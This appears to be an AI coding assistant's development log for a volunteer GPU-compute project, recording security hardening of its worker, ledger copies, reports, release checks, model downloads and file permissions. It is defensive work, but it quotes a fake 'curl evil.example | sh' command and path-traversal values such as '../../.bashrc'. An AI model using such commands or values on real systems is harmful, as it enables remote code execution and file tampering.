- **New `app/worker_guard.py`**, used for every request `demo_worker.py` makes. Before, the worker trusted every reply's *shape* (it already checked job signatures, so it never *ran* a fake job, but it could be knocked over before it got that far). What I found and fixed:
  1. **No size limit on replies.** A fake coordinator could send 5 GB and the worker would try to hold it all in memory. Now replies over **8 MiB** are refused: before reading a byte if the reply says its size, otherwise the moment it passes 8 MiB. (The biggest honest reply is about 4 MiB.)
  2. **Zip bombs.** The worker let httpx unpack compressed replies; 50 KB of gzip can unpack to 50 MB, and 1 MB to 1 GB. Now it asks for an uncompressed reply and refuses any compressed one.
  3. **Slow drip.** The old 10-second timeout was *per read*, so one byte every 9 seconds kept the worker waiting for ever. Now the whole reply must arrive within **60 seconds**.
  4. **Crashes on broken JSON.** HTML instead of JSON, 200,000 `[` in a row, `NaN`, a 6,000-digit number, bad bytes, or a list where a job should be: all crashed the worker with a stack trace. Now each is a one-line "Stopped: ..." message.
  5. **Terminal tricks.** The worker printed the coordinator's error messages and a refused job's id exactly as sent. Hidden codes in that text can clear the owner's screen, change the window title, draw a fake `root@rig:~#` prompt, or flip text right-to-left. Now every bit of coordinator text is printed with those characters turned into `?`, cut to 200 characters.
  6. **Any reply saved as the key.** On enrolment the worker saved whatever came back as its key, newlines and all. Now it must look exactly like a real key (`bnhw_` plus 32-128 safe characters) or nothing is saved.
  7. **Job ids in the URL.** The worker puts the job id into the submit address. An id like `../workers/register` (even one signed with a stolen key) could point that somewhere else. Now job ids are letters, digits, `_` and `-` only.
  8. **Spinning.** Handed nothing but bad jobs, the worker asked again instantly, as fast as the network allowed. Now it waits 5, 10, 20, 40, then 60 seconds between tries.
  9. **Key over plain http.** Signatures protect the *jobs*, but the worker's key goes with every request. Over `http://` to another computer, anyone on the network can read it and pretend to be that rig. Now `http://` is only allowed to the same machine (`127.0.0.1`, `localhost`); anything else needs `https://`, or `--allow-plain-http` for a test lab you control. (Added to your to-do list as "good to know".)
- **Proof.**
  - 103 new tests, **1,166 total: 1,165 passing, 1 skipped** (the release test that only runs once the work is committed, as designed). The fuzz sends 16 kinds of hostile reply to each worker step (fetching the coordinator key, enrolling, claiming a job) and replaces each field of a signed job with 15 hostile values. The rule: stop cleanly or carry on; never crash, never print a control character, never pin, save or run anything hostile. An honest job still runs and is submitted.
  - Checked against a **real hostile web server** on a real network socket, not just a simulation: an endless reply was cut off at 8 MiB (the server got 12 MiB out before the worker hung up), a reply claiming 5 GiB was refused at once, a gzip bomb was refused, and a one-byte-every-half-second drip was given up at the deadline.
  - I broke the guards 21 ways on purpose (removed each size, time, depth, `NaN`, encoding and shape check, followed redirects, printed raw text, let plain http through, removed the wait...). **20 were caught.** The one that slipped past: printing the submit reply raw. That turned out to be safe anyway, because Python already escapes control codes when it prints a whole dictionary, so that guard is a second layer.
- **Honest limits:** this protects the worker from bad *replies*, not from a coordinator that signs bad jobs with the real key (the coordinator is trusted; signature, model-pin and hash checks are unchanged). A server that drips its *headers* (not the body) slowly is still only limited by the 10-second-per-read timeout. Only the worker uses these guards; the operator's own tools talk to your own coordinator.

**What you learned**
1. **Both ends of a connection need guards.** Last session made the coordinator safe from bad workers. A worker on a volunteer's PC has to be just as careful, because "the coordinator" is simply whoever answers at that address.
2. **A signature checks the message, not the delivery.** Signed jobs couldn't be faked before either, but a reply can still be huge, slow or malformed *before* the signature is ever checked. Limits come first, then the signature.
3. **Text can be a weapon in a terminal.** The `ESC` character starts hidden commands for the terminal (colours, clear screen, window title). Printing a stranger's text without removing them is like pasting it into the terminal's settings.
4. **http vs https.** With `http://` anyone between the two computers (same Wi-Fi, the router, the internet provider) can read and change everything sent, including passwords and keys. `https://` encrypts it. On one machine (`127.0.0.1`) nothing travels over the network, so http is fine there.

## 2026-11-24 (14:35 UTC): A ledger copy is a file from a stranger, so check it like one (0.5.54)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The last two sessions threw junk at the coordinator and at the worker. This one turns to the third thing strangers touch: the **ledger copies** we publish on `/reports/` and tell everyone to download and re-check. Our checking tools opened those files like any trusted database. But a SQLite file can carry more than rows, and the person running the check is a volunteer, maybe on a copy from a fake mirror or a pull request.

**Shipped (`copy-open-v1`)**
- **New `prototype/app/copy_guard.py`**, run before any of our code reads a copy. What I found and fixed:
  1. **A "time-bomb" copy passed verification.** A table inside the file can be swapped for a *view*, which is a small program. I built a copy whose `submissions` view shows the honest points until a date and adds 1,000 after it. Our `verify` said it matched the signed report perfectly. The same kind of file with a date in the past failed. Same bytes, same sha256, different numbers depending on the reader's clock. Now views (and triggers, and virtual tables) are refused, and a copy must have exactly the tables, columns and indexes that `ledger_copy export` writes.
  2. **Checking a copy could change it.** If a half-finished write left a `-journal` file next to a copy, a normal open "repairs" the copy from it, rewriting the file on your disk, so its sha256 no longer matches the published one. Shown in a test. Now copies are opened read-only *and* "immutable": SQLite ignores anything next to the file and never writes or creates a file.
  3. **Quiet damage.** An index can disagree with its table while every page still looks fine; a lookup and a full scan then give different answers. Now `integrity_check` must say `ok`, and every row is read once up front.
  4. **Size and time.** Files over 512 MiB, single values over 1 MiB and anything that isn't a SQLite file are refused before SQLite parses them; every connection is stopped after 5 minutes.
  5. **Crashes.** An empty `copy_info` table crashed with a `TypeError`, and a junk file printed a Python traceback from `ledger_copy info`. Now every tool prints one line ("refusing to read ...") and exits with code 2.
- **Used by** `rewards verify --db`, `ledger_copy compare` and `info`, and `publish_report add|check`. Your own export runs the same check on its output before saving, so an honest copy can never be one the tools refuse. Your live ledger (the operator's own tools) is opened exactly as before.
- **Proof.**
  - 28 new tests, **1,194 total: 1,193 passing, 1 skipped** (the release test that only runs on a committed tree, as designed). Run on Python 3.13 and on Python 3.11 (what CI uses, with an older SQLite and without one of the extra switches).
  - I broke the guard 19 ways on purpose. **12 were caught by my first tests; the other 7 only after I added tests** (e.g. turning off the "immutable" open slipped past until I added a copy in WAL format, which a normal read-only open quietly adds two files beside). The tests also caught a real bug in the guard: the size limit was frozen when the module loaded.
- **Honest limits:** this makes *reading* a copy safe; it doesn't make the numbers true (the signature, the consistency checks and `compare` do that). It can't protect against a bug inside SQLite itself, so keep Python updated. Nothing is published yet, so nobody has run into this; the point was to fix it before the first period goes up.

**What you learned**
1. **A database file can contain code.** A "view" looks like a table but runs a query every time it's read. That's handy in your own database and dangerous in someone else's.
2. **Same hash, different meaning.** A sha256 proves the bytes didn't change. It doesn't prove the bytes mean the same thing tomorrow, if they contain code that looks at the date.
3. **Opening can be writing.** SQLite "fixes" a file on open if it finds a leftover journal. For evidence files, open read-only and immutable so the evidence stays exactly as published.
4. **Allow-list, don't block-list.** Instead of listing every bad thing a file might hold, the guard says what a good copy looks like (these tables, these columns, nothing else) and refuses everything else.

## 2026-11-24 (15:30 UTC): The files people download to check us were trusted too much (0.5.55)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The last three sessions hardened the coordinator, the worker and the ledger-copy reader against hostile input. One kind of stranger's file was left: the **JSON** ones. Volunteers will download a signed report from `/reports/` (or from a mirror, a chat, a pull request) and check it; rigs will check a release's file list and signatures before running the worker; and CI re-checks `reports/index.json` (the file the logbook page displays) on every pull request, including ones from strangers.

**Shipped (`json-file-v1`)**
- **A real hole, found and fixed: a borrowed fingerprint passed the check.** A signed report carries a short `fingerprint` next to its signature, like `38b8-bc7b-c882-2bb5`, for people to compare with the coordinator's. That field isn't part of what's signed; it's only a label. `rewards verify --no-db` printed the label from the file. So I made a report with 1,000,000 points, signed it with my *own* key, pasted the real coordinator's fingerprint into the label, and the tool said "signed by 38b8-bc7b-c882-2bb5 ... OK". Anyone comparing fingerprints, as the tool told them to, would have been fooled. Now the label must belong to the key that actually signed (otherwise `MISMATCH`), and the tool prints the fingerprint it works out itself. The `/reports/` page already told people to pass `--public-key`, which always caught it.
- **A second one: the page's numbers were never checked.** The logbook page shows rigs, results, simulated points, scoring version and fingerprints from `index.json`. The CI check compared file hashes only. So a pull request that changed "points: 120" to "points: 1,000,000" in `index.json` would have passed CI and gone live. Now CI checks every value the page shows against the signed report, the coordinator line against the key that signed the newest period, each file size, and "history unchanged". Entries can only hold the fields our tool writes and can only point at their own two files (it used to follow any path, even `/etc/passwd`).
- **New `prototype/app/json_file.py`**, used by all three tools (`rewards verify`, `release verify`, `publish_report`). It refuses: something that isn't a normal file (a "named pipe" made the tool hang for ever; `/dev/zero` filled memory); files over 4 MiB (reports 64 MiB), before reading and again while reading; text that isn't UTF-8; brackets nested more than 32 deep (100,000 of them crashed the tools); `NaN` and `Infinity`; and **the same key twice** in one object.
- **No more crashes**: a list, `null` or wrong shapes inside a report now give `MISMATCH` or a one-line "refusing to read it" instead of a Python traceback.
- **A small catch everywhere:** in Python, the pattern `^abc$` also matches `"abc"` followed by a line break. 18 patterns in the code used `$`; they now use `\Z` (true end of text). One of them decided whether a value was written into the log as-is, so a value ending in a line break could add a line to the log. A test now fails if anyone adds a `$` pattern again.
- **Proof.**
  - 59 new tests, **1,253 total: 1,252 passing, 1 skipped** (the release test that only runs on a committed tree, as designed). Run on Python 3.13 and 3.11 (what CI uses). The CI steps (lock, licenses, workflow pins, reports check, site and accessibility checks) all pass.
  - I broke the new checks 31 ways on purpose. **30 were caught** (5 only after I added tests). The one that slipped past: printing the file's label instead of the computed fingerprint. That can't show anything different anymore, because the label is refused unless it matches; it's a second layer.
- **Honest limits:** this makes reading these files safe and makes the page match the signed files. It doesn't make a report *true* (the signature and re-checks do that), and you still need the coordinator's key from a place you trust. Nothing is published yet, so nobody was fooled; the point was to close it before the first period goes up.

**What you learned**
1. **Not everything next to a signature is signed.** A signature covers exact fields. Anything else in the file, even a field *about* the signature, can be changed freely. Tools should only show what they checked or computed themselves.
2. **Check what people see, not just the files.** Hashes proved the downloads were intact, but the page displayed numbers from a different file that nobody compared. Every value on a page needs a check behind it.
3. **Duplicate keys are a trick.** `{"points": 1, "points": 9999}` is "valid-ish" JSON. Python reads the last one; some programs read the first. Refusing duplicates means everyone reads the same thing.
4. **`$` isn't quite "the end".** In Python regular expressions, `$` also allows one line break at the end. `\Z` means the real end. Small, but line breaks are exactly what attackers use to fake extra log lines or names.

## 2026-11-24 (16:15 UTC): The hardware check trusted the files a rig sends in (0.5.56)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The last four sessions hardened everything strangers touch: the coordinator, the worker, ledger copies and the JSON reports. One reader was left: `phase3_check`, the tool that turns a rig's inventory and test-run files into the hardware checklist. Today those files come from your rig; later, from volunteers ("evidence gets strong when someone else repeats the run"). So they are files from strangers too.

**Shipped (`rig-report-v1`)**
- **A real hole, found and fixed: the text "false" counted as true.** The checker asked "did the run exit cleanly?" with `if not exit_ok`. In Python any non-empty text counts as *true*, including the word `"false"`. I took an honest run, set the exit code to 1 and wrote `"exit_ok": "false"` (in quotes, as text, which is an easy slip when editing by hand): the old checker counted it as a **passing** smoke test. Same with `"target_card_busy": "false"`: a card that never did the work counted as busy. Now every yes/no field must be a real `true` or `false`.
- **Crashes fixed:** a temperature written as a 400-digit number crashed the printout; `"readings": null` crashed it; an AMD card listed without a slot, or a render node without a name, crashed it. Now they're refused with one line, or shown as `?`.
- **Terminal tricks:** the OS, kernel, card and driver names were printed exactly as written, so hidden codes in them could clear your screen or fake a prompt (same trick as session 0.5.53). Names must now be plain printable text, at most 200 characters, and every printed line and file name is cleaned as a second layer.
- **Reading:** the files go through the same safe reader as reports (`app/json_file.py`): normal files only (a named pipe made it hang), at most 4 MiB (honest ones are 5-100 KB), no nesting tricks, no `NaN`, no key written twice.
- **How it works:** two lists in `app/phase3_check.py` (`INVENTORY_SPEC`, `RUN_SPEC`) name every field the checker reads and its type. A missing field is fine (the checklist just finds less evidence, as before); a wrong type is refused with one line naming the file and the field (exit code 2).
- **A second find, elsewhere:** the safe reader from last session (and the worker's) refused `NaN` and `Infinity`, but `1e400` (a 1 followed by 400 zeros, written short) quietly became *infinity*. Both now refuse any number too big for the computer to hold.
- **Proof.**
  - 675 new tests, **1,928 total: 1,927 passing, 1 skipped** (the release test that only runs on a committed tree, as designed). Run on Python 3.13 and on 3.11 (what CI uses).
  - The tests take honest files made by the real recording tools, then replace **every field the checker reads with every wrong kind of value** (about 600 cases: text for numbers, `"false"` for false, lists for objects, 400-digit numbers, hidden terminal codes, invisible characters...). Each must be refused with one clean line. Then every field is deleted or set to `null` one at a time: no crash allowed.
  - A "tracing" test watches which fields the checker actually reads and fails if it ever reads one the lists don't type-check. So if someone teaches the checker something new later, they can't forget the safety check.
  - Shown against the old code: the edited crashed run passed, the 400-digit temperature crashed it.
  - I broke the new checks 23 ways on purpose. **23 were caught** (one only after I added a test for the saved `--out` file; one break changed nothing because that check was redundant, so I removed it).
- **Honest limits:** the rig files are still unsigned. This catches mistakes, sloppy edits and hostile files, not a careful forger who writes the right types; a repeat on someone else's rig is what makes them evidence. Still never run on real rig output.

**What you learned**
1. **"false" in quotes is not false.** `false` (no quotes) is a yes/no value; `"false"` (in quotes) is five letters of text. Many languages, Python included, treat any non-empty text as "yes". Checking the *type*, not just the value, closes that.
2. **Allow-list the fields you read.** Instead of guessing what a bad file might contain, write down exactly which fields the tool uses and what each must be. Everything the tool touches is checked; everything else is ignored.
3. **A test can watch the code read.** Wrapping the data so it records every field looked up lets a test prove "nothing is read without being checked first", even after future changes.
4. **Computers have a biggest number.** A normal decimal number tops out near 1.8 × 10^308. Write `1e400` and many readers silently turn it into "infinity", which then breaks maths and comparisons in odd ways. Refuse it at the door.

## 2026-11-24 (17:30 UTC): The release check looked for the wrong kind of file (0.5.57)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session continued the "code audit" item. The Stay Safe page tells people: before you run a download, check it with `python -m app.release verify ... --root .`. That makes the folder being checked a gift from a stranger. I went looking for ways to sneak code past it.

**Found: three ways to get code past the check, all shown really running**
1. **A compiled file next to the code.** Python can run `.pyc` files (compiled Python) with no `.py` beside them. Drop a `json.pyc` into the folder and, because `python -m` looks in the folder first, it is loaded instead of Python's own `json`. The check skipped every `.pyc` file. Same for `.so` files (compiled C), which it called "extra files, not code".
2. **A cache file posing as the real one.** Python keeps compiled copies in `__pycache__` folders and trusts one if its label says "made from a file with this date and this size". A download can carry any date. I made a cache with the real `worker.py`'s date and size but other code inside: the signed `worker.py` checked out perfectly, and Python ran the cache instead. The check skipped `__pycache__` entirely.
3. **A shortcut (link) named like a module.** A link called `json` pointing to a folder elsewhere. The check didn't look behind links; Python does.
In all three, `verify` printed **OK** and then starting the worker printed `EVIL CODE RAN`.

**Shipped (`release-folder-v1`)**
- **Anything Python could load that isn't in the signed release now fails the check**: every file ending Python can import (the test asks Python itself for its list), links, and any folder the check can't read (it used to skip those silently).
- **Caches are checked instead of skipped.** A cache passes only if it is *exactly*, byte for byte, what this copy of Python would build from the already-checked source file. The check never opens a cache up to look inside (that unpacking step isn't safe on hostile files); it builds its own and compares.
- **The fix for any cache problem is always the same and always safe:** delete the `__pycache__` folders and run the check again. Python rebuilds them from the checked source.
- Smaller things: listed files are opened without following links or hanging on pipes, and never read past their signed size; file names with hidden terminal codes or broken characters can't mess up the printout; a version number with hidden spaces or line breaks is refused.
- **Proof.**
  - 53 new tests, **1,983 total: 1,981 passing, 2 skipped** (the release test that only runs on a committed tree, and the real unreadable-folder test, which can't work as the all-powerful root user; I ran it separately as an ordinary user and it passed). Run on Python 3.13 and 3.11 (what CI uses).
  - Each of the three holes has a test that first shows the planted code really runs, then that the check now catches it. 47 of the new tests fail against the old code.
  - Honest caches made by Python itself pass, in every flavour Python can write.
  - I broke the new checks 17 ways on purpose; all 17 were caught. Two earlier attempts showed two checks were redundant (the read was already limited), so I removed them.
  - Dogfood: I made a throwaway release of this repo's own `prototype/` folder, signed it with two throwaway keys and checked it. The first try failed on 31 caches left by a Python 3.11 test run (exactly as designed: it can't compare another version's caches). After deleting those, it passed with 42 caches Python had built itself.
- **Honest limits:** it checks the folder at the moment you run it. It covers what Python loads from the release folder, not your installed packages (the lock file's hashes cover those), llama.cpp or model files. `data/`, `venv` and `node_modules` are still skipped. No signed release exists yet; choosing signers is still your step.

**What you learned**
1. **Python runs more than `.py` files.** It also runs compiled `.pyc` files and `.so` libraries, and it will follow links. A check that only looks for `.py` files is checking the wrong thing.
2. **Caches are trusted by their label.** A cache file says "I was made from a file of this size, saved at this time". Python believes the label. Labels can lie, so the check now rebuilds the cache itself and compares every byte.
3. **"Where does Python look first?"** `python -m` searches the current folder before its own built-in modules, so a file named like a built-in (`json`, `hashlib`) in that folder wins. This is called *shadowing*.
4. **A silent skip is a hole.** If a checker can't read a folder and just moves on, that folder is the perfect hiding place. Now "can't read it" means "can't vouch for it", and the check fails.

## 2026-11-24 (18:30 UTC): The model download trusted whatever the internet sent (0.5.58)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The next thing you'll actually do on the rig, once llama.cpp builds, is download the first AI model (~400 MB) and "pin" it. That download is the one place where our code takes a big file straight from the internet, so this session's "code audit" pass looked at it.

**Found, shown really happening** (with a small HTTPS server on this machine pretending to be a bad mirror)
1. **No size limit and no time limit.** A server that never stops sending: the old download wrote **2.5 GB in 6 seconds** and would have kept going until the disk was full.
2. **Redirects anywhere, even to plain http.** The server said "the file moved to `http://...`" (no encryption, so anyone on the network could swap it). The old code followed it and wrote **3.2 GB in 6 seconds**.
3. **The first download was checked against nothing,** and `pin` then recorded whatever had arrived as the trusted fingerprint. Whoever controlled the download on day one would have controlled the pin.
4. **Smaller ones:** a planted shortcut (link) named `<model>.gguf.part` made the download write into another file; a finished download silently replaced a file already there; the registry's file name was used unchecked (`../../.bashrc` would have pointed outside the models folder); a missing field crashed it with a traceback; a typo like `sha265` silently left a model unpinned; `pin` quietly changed an existing pin; a named pipe given as "the model" hung it.

**Shipped (`model-fetch-v1`)**
- **Limits on the download:** https only (redirects too, at most 5), no compressed replies, a size cap (the pinned size, or twice the registry's estimate: 800 MB for the Qwen model), a 60-minute overall limit, a free-disk-space check first, and a reply that ends early is refused.
- **Checked against the model page:** `--expect-sha256` takes the fingerprint Hugging Face shows for the file. The download checks it while writing and deletes a file that doesn't match. Without it, the download prints **NOT CHECKED** in capitals. `pin` from the command line now needs that fingerprint (or you must say `--no-expected-hash` on purpose), and won't change an existing pin unless you add `--replace`.
- **Files on disk:** downloads go into a fresh, randomly named temporary file and are only moved into place if every check passed and nothing of that name exists already. If the model is already there and matches the pin, nothing is downloaded.
- **The registry:** every field is checked; a broken registry gives one plain line, and the worker simply stops offering AI jobs instead of crashing. Pins are written all-or-nothing (a crash leaves the old file).
- **Proof.**
  - 100 new tests, **2,083 total: 2,082 passing, 1 skipped** (one that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
  - The tests play back every bad-server trick above through a fake network (no real downloads).
  - I broke the new checks 25 ways on purpose; **all 25 were caught.**
  - The same local HTTPS server against the new code: the http redirect was refused before a single byte, the endless reply stopped at 64 MB, nothing was left on disk. A real 5 MB test file: downloaded and checked, a wrong fingerprint refused and deleted, pinned, a second download skipped ("already here"), `verify` OK.
- **Honest limits:** a fingerprint from the model page proves the file wasn't changed *on the way*, not that the publisher's model is honest. No real model was downloaded (this sandbox can't reach Hugging Face). Someone who can already write to your models folder could still swap the file between the worker's check and llama.cpp opening it.
- **New step for you** is in USER_TODO ("download and pin the first model"): copy the SHA256 from the file's page on Hugging Face and pass it to both commands.

**What you learned**
1. **A download is a conversation with a stranger.** The server decides how big the file is, how long it takes and where to send you next. Good download code sets its own limits instead of trusting the server's.
2. **"Trust on first use" is only as good as the first use.** Pinning records a fingerprint so later copies can be checked, but if the very first copy was bad, the pin protects the bad file. Checking against a fingerprint published somewhere else (the model page) closes that gap.
3. **A redirect can downgrade you.** https is encrypted; plain http is not. If the code follows a "moved to http://..." redirect, the encryption you started with is gone. Each hop has to be checked, not just the first address.
4. **Write to a new file, then swap it in.** Writing straight into the final name (or a predictable temp name) lets a crash leave half a file, or a planted link redirect the write. A fresh random temp file, moved into place only when finished, avoids both.

## 2026-11-24 (19:30 UTC): Other people on the same computer could read the hidden-test answers (0.5.59)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the eighth "code audit" pass. Earlier passes looked at what comes in from outside (the network, files from strangers, downloads). This one looked at the files our own programs leave on the computer they run on, and asked: **who else on that computer can read or change them?**

**Found, shown really happening** (this sandbox has a second, ordinary account called `nobody`; I ran commands as that account)
1. **The ledger was readable by everyone.** The coordinator's database (`data/prototype.sqlite3`) holds the **expected answer of every hidden test**, who each test is aimed at, job inputs and key fingerprints. It was created with the computer's usual setting, "everyone may read". As `nobody`, I copied it and printed a hidden test's answer. Anyone else with an account on the coordinator's computer could have done the same, then passed every hidden test.
2. **The worker didn't check its own key file.** If `worker-<id>.key` was readable by others (easy to do by copying it from another computer), the worker used it anyway. The coordinator's signing key already had this check; the worker's key didn't.
3. **The pinned coordinator key could be swapped.** The worker trusts the key in `data/coordinator.pub`. If that sat in a folder anyone can write to, another user could delete it and put their own coordinator's key there, and the worker would trust their coordinator. (Replayed in the tests.)
4. **A "pipe" instead of a key file froze things forever.** A named pipe is a special file that waits for someone to write into it. Put one where the worker key, a pinned key or the signing key should be, and the worker or coordinator hung. Also, the signing key's "only you can read it" check looked at the file, then opened it again by name, leaving a moment where it could be swapped.

**Shipped (`secret-file-v1`)**
- **One place for the rules:** new `app/secret_file.py`.
- **The ledger is now private:** the coordinator makes the `data/` folder owner-only and creates an empty owner-only ledger before the database engine touches it, so the database's helper files come out private too. The same `nobody` test now gets **Permission denied**. An older ledger that others can read makes the coordinator stop and print the exact fix (`chmod 600 ...`).
- **The worker checks its files** before sending its key anywhere: the key must not be readable by others, pinned keys must not be changeable by others (file or folder), and each must actually hold a key. Each problem is one plain line with the fix.
- **Every key and pin file** is opened once without waiting, then checked on that same open file: a normal file, yours, small. New ones are created private and never written over an existing file or through a planted shortcut (link).
- **Nothing changes for an ordinary setup:** an existing `data/` folder that only you can change keeps working and is never modified.
- **Proof.**
  - 41 new tests, **2,124 total: 2,123 passing, 1 skipped** (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses). The real second-account test runs here (as root) and is skipped in CI, which doesn't run as root.
  - **18 of the new tests fail on the old code**, including the real `nobody` one, which printed the hidden answer.
  - I broke the new checks 20 ways on purpose; **19 were caught.** The one not caught: writing a pin straight into the file instead of writing a new one and swapping it in. That only differs if the computer crashes halfway through writing, which a test can't easily do; noted honestly.
  - Five older tests made their test files with "everyone may read" and now fail the new checks (correctly), so they now make them private.
- **Honest limits:** this protects against *other accounts* on the same computer and against mistakes. The administrator (root), or anything running as your own account, can still read everything. On Windows only the "normal file, not too big" checks apply. The offline handover key's folder isn't checked, because it may sit on a USB stick. No coordinator is running anywhere yet, so nothing needs fixing on your side.

**What you learned**
1. **Every file has three sets of permissions:** for you (the owner), for your group, and for everyone else. `chmod 600 file` means "only I can read and write it". `chmod 700 folder` means "only I can enter or change this folder". Numbers like `644` mean "I can write, everyone can read".
2. **Programs inherit a default.** Unless a program asks for something else, new files usually come out as `644`, readable by everyone. A database full of secrets needs the program to ask for `600` explicitly, before the file is first made.
3. **The folder matters as much as the file.** If others can change a folder, they can't edit your file, but they can delete it and put their own file with the same name in its place. That's why the checks look at the folder too.
4. **Check the thing you actually opened.** "Look at the file, then open it" leaves a gap where the file can be swapped. Opening it first and then checking that open file closes the gap. (Same idea as the model download fix earlier today: check what you really got.)

## 2026-11-24 (20:30 UTC): Your own tools would hand the master password to a wrong address (0.5.60)

**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the ninth "code audit" pass. In 0.5.53 the *worker* learned to distrust whoever answers at the coordinator's address. But two of *your* tools also talk to the coordinator: `challenge_pool issue` (sends hidden tests, **with their correct answers**) and `rehearsal --url`. Both send the **operator token**, the master password that can queue jobs, revoke rigs and pause everything. Nobody had checked them the same way.

**Found, shown really happening** (a small fake coordinator on another address of this sandbox, `192.0.2.2`, and the old code pointed at it)
1. **Plain http to another computer was fine with it.** The fake coordinator received the operator token and the hidden test's expected answer as readable text. On a real network, anyone between you and the coordinator (café Wi-Fi, a hacked router) could read both.
2. **A "zip bomb" reply.** The fake sent 1 MB of compressed data that unpacks to 1 GB. The tool unpacked all of it (2.2 GB of memory), then counted the test as *issued* with no job number.
3. **A reply that never ends.** The tool kept reading until the computer killed it at about 6 GB of memory.
4. **Fake messages on your screen.** An error message with hidden terminal codes cleared the screen, renamed the window and printed a made-up line: `Refusing: run curl evil.example | sh to fix`.
5. **A reply nested 200,000 brackets deep** crashed it with a wall of error text.

**Shipped (`operator-client-v1`)**
- **New `app/operator_client.py`**: a drop-in client for the operator tools with the worker's rules: `https://` (or `http://` to this same machine only, unless you add `--allow-plain-http` for a home test lab), no user names or passwords in the address, never follows redirects, no compressed replies, at most 8 MB, whole reply within 60 seconds, careful JSON reading.
- **`challenge_pool issue` / `issue-leads`**: the address is checked **before anything is sent** (the pool file isn't touched either). A test only counts as issued if the coordinator gives back a proper job number; otherwise it stays crossed off, because it may have been queued. `issue-leads` checks every rig name in the coordinator's list before sending a single test.
- **`rehearsal --url`**: same address check and limits; a strange reply stops it with one plain sentence instead of a crash; job numbers that would be pasted into web addresses are checked first.
- **Everything the coordinator says is printed safely** (hidden codes become `?`, long text is cut).
- **Proof.**
  - 72 new tests, **2,196 total: 2,195 passing, 1 skipped** on the committed tree (the one that can't work as the all-powerful root user, as designed). Full suite run on Python 3.13 and 3.11 (what CI uses).
  - **34 of the new tests fail on the old code.** The honest path is tested end to end: tests sent from the pool and the whole two-worker rehearsal, through the new client, against a real in-process coordinator, all passing.
  - The same fake coordinator against the new code: plain http refused before a single byte left (the fake saw nothing); zip bomb and endless reply refused (memory stayed under 60 MB); hidden codes shown as `?`; the deep reply a one-line refusal.
  - I broke the new checks 26 ways on purpose; **24 were caught.** The 2 not caught are backup layers in the rehearsal (its summary already cleans what it prints, and its report file is JSON, which can't carry raw terminal codes). One check turned out to be doing nothing (a setting made twice), so I removed it.
- **Honest limits:** https proves you reached *a* server with a valid certificate for that name, not that it's *your* coordinator, so keep the address right. The token still lives in your environment while the tool runs. Redirects weren't followed before either (that was already the library's default); now it's guaranteed. No coordinator is running anywhere yet, so nothing needs fixing on your side; your usual `--url http://127.0.0.1:8000` on the coordinator's own machine works exactly as before.

**What you learned**
1. **http vs https on the wire.** With `http://`, everything you send (passwords, answers) travels as readable text through every machine between you and the server. `https://` encrypts it. "localhost" / `127.0.0.1` never leaves your computer, so plain http is fine there and only there.
2. **Your own tools are part of the attack surface.** We'd hardened the coordinator (what strangers send it) and the worker (what it receives). The operator's tools carry the most valuable secret of all, so they need the same distrust.
3. **A "zip bomb"** is a tiny compressed file that unpacks into something enormous. The defence is simple: ask for uncompressed replies and refuse anything compressed, so there's nothing to unpack.
4. **"Unknown" is safer than "yes".** When a reply is broken, the tool can't tell whether the test was queued. Calling it "unknown" and never reusing that test is safer than guessing "issued" (or "not sent" and sending it twice).
